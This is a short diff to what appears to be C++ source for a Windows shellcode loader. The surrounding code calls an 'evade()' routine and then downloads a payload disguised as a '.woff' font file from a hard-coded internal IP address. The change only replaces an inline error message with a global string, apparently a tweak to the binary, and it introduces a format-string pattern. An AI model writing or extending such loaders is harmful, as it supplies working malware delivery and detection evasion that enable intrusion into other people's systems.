@@ -176,13 +176,15 @@ void evade() {
     }
 };
 
+char uriError[] = "Error: Unable to retrieve the specified URI.\n";
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     evade();
 	std::vector<BYTE> payload;
 	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
 
     if (!GetPayloadFromUrl(url, payload)) {
-        printf("Error reaching URI\n");
+        printf(uriError);
         return 1;
     }
 
